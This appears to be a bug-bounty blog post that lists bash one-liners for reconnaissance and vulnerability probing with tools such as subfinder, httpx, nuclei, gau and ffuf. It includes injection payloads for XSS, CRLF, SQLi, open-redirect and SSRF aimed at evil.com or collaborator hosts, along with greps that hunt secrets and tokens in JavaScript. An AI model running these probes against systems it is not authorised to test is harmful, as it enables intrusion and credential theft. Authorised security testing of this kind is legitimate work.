---
title: "Hacking One Liners"
date: 2025-04-10 +0530
categories: [Cyber-Security]
tags: [one-liners, subfinder, httpx, nuclei, ffuf, gau, gospider, naabu, bash, shuffledns, dnsx, notify, recon, automation, js, token-hunting]
order: 3
---

A curated collection of powerful, compact one-liners used throughout reconnaissance, scanning, and early exploitation workflows. These are quick-fire tools for chaining recon steps, automating scans, or rapidly discovering weak points.

---

## 🔍 Subdomains → Live Hosts → Scan

```bash
subfinder -d example.com -silent | httpx -silent | nuclei -silent -t ~/nuclei-templates -o results.txt
```

## 🔁 Passive URLs → Filter → Nuclei

```bash
gau example.com | grep -iE '\.php|\.asp|\.aspx|\.jsp' | httpx -silent | nuclei -silent -o tech-findings.txt
```

## ⚡ Quick Port Discovery + Probing

```bash
naabu -host example.com -top-ports 100 | httpx -silent -title -status-code
```

## 🕸️ Subdomains → Resolve → Probing → Nuclei

```bash
subfinder -d example.com -silent | dnsx -silent | httpx -silent | nuclei -t cves/ -o cve-scan.txt
```

## 🧪 Wordlist Fuzz → Live Endpoint Test

```bash
ffuf -u https://example.com/FUZZ -w common.txt -mc 200 | awk '{print $1}' | httpx -silent | nuclei -o ffuf-discovered.txt
```

## 🧠 Passive + Active URL Collect + Scan

```bash
(subfinder -d example.com; gau example.com) | sort -u | httpx -silent | nuclei -o passive-active-results.txt
```

## 🧼 Filter JavaScript Files for Review

```bash
gau example.com | grep '\.js$' | sort -u | httpx -silent -mc 200 | tee js-live.txt
```

## 🛠️ Crawl → Extract URLs → Scan

```bash
gospider -s https://example.com -t 10 -q | grep -oP 'https?://[^ ]+' | httpx -silent | nuclei -silent -o spider-findings.txt
```

## 🔓 Nuclei Fast Severity Filter

```bash
cat live.txt | nuclei -severity high,critical -silent -o high-crit.txt
```

## 🧪 JS → Endpoint Extraction (deep)

```bash
cat js-live.txt | xargs -n1 -I{} curl -s {} | grep -oP 'https?://[^\"]+' | sort -u
```

## 🎣 Open Redirect Detection

```bash
gau target.com | grep "=" | qsreplace 'https://evil.com' | httpx -silent -location -fr -mc 301,302 | grep 'evil.com'
```

## 🧠 Param Mining + Fuzz

```bash
gau target.com | uro | grep "=" | gf xss | qsreplace 'FUZZ' | ffuf -u FUZZEDURL -w payloads.txt -mc 200
```

## 🧪 SSRF Testing

```bash
cat urls.txt | gf ssrf | qsreplace 'http://your-burp-collab.com' | httpx -silent -fr
```

## 🪝 XSS Reflected Testing

```bash
cat urls.txt | grep "=" | qsreplace '<svg onload=alert(1)>' | httpx -silent -mc 200 -sr | grep '<svg onload=alert(1)>'
```

## 🗂️ Sitemap Extractor

```bash
curl -s https://target.com/sitemap.xml | grep -oP '(?<=<loc>).*?(?=</loc>)'
```

## 🗃️ Git Folder Check

```bash
httpx -l subs.txt -path /.git/config -mc 200
```

## 🔁 HTTP Method Tester

```bash
for m in GET POST PUT DELETE OPTIONS TRACE PATCH; do curl -X $m -I https://target.com | grep HTTP; done
```

## 🧾 Form Extraction

```bash
cat alive.txt | xargs -n1 -I{} curl -s {} | pup 'form json{}' | jq .
```

## 🔐 CORS Misconfig Check

```bash
curl -H 'Origin: https://evil.com' -I https://target.com | grep 'Access-Control-Allow-Origin'
```

## 🧬 SQLi Prober

```bash
gau target.com | grep "=" | qsreplace "'" | httpx -silent -mc 500,403,400
```

## ⚠️ CRLF Injection Test

```bash
cat urls.txt | qsreplace '%0d%0aPoC:CRLF' | httpx -silent -fr -mc 200 | grep 'PoC:CRLF'
```

## 📬 Email Discovery

```bash
gau target.com | xargs -n1 curl -s | grep -Ei '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' | sort -u
```

## 🪛 Find Secrets in JS

```bash
cat js-live.txt | xargs -n1 curl -s | grep -Eo 'API_KEY|api_key|secret|Bearer [A-Za-z0-9\\-_\\.]+' | sort -u
```

## 📂 Extension/Backup File Discovery

```bash
gau target.com | grep -iE '\.zip|\.gz|\.sql|\.tar|\.bak' | httpx -silent -mc 200
```

## 🧾 Wayback Param Harvesting

```bash
gau target.com | cut -d '?' -f2 | cut -d '&' -f1 | sort -u
```

## 🔗 Dangling Subdomain Takeover Check

```bash
subfinder -d target.com -silent | dnsx -a -cname -resp-only | grep -iE 'github|heroku|amazonaws'
```

## 🪞 Mirror Target Webpage

```bash
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://target.com
```

## 🧼 Clean Noise from URLs

```bash
cat all-urls.txt | grep -vE '\.(png|jpg|jpeg|gif|svg|css|ico|woff|ttf|pdf)$' | sort -u
```

## 🧹 Dedupe + Filter Live URLs

```bash
cat urls.txt | sort -u | httpx -silent -mc 200 | anew final.txt
```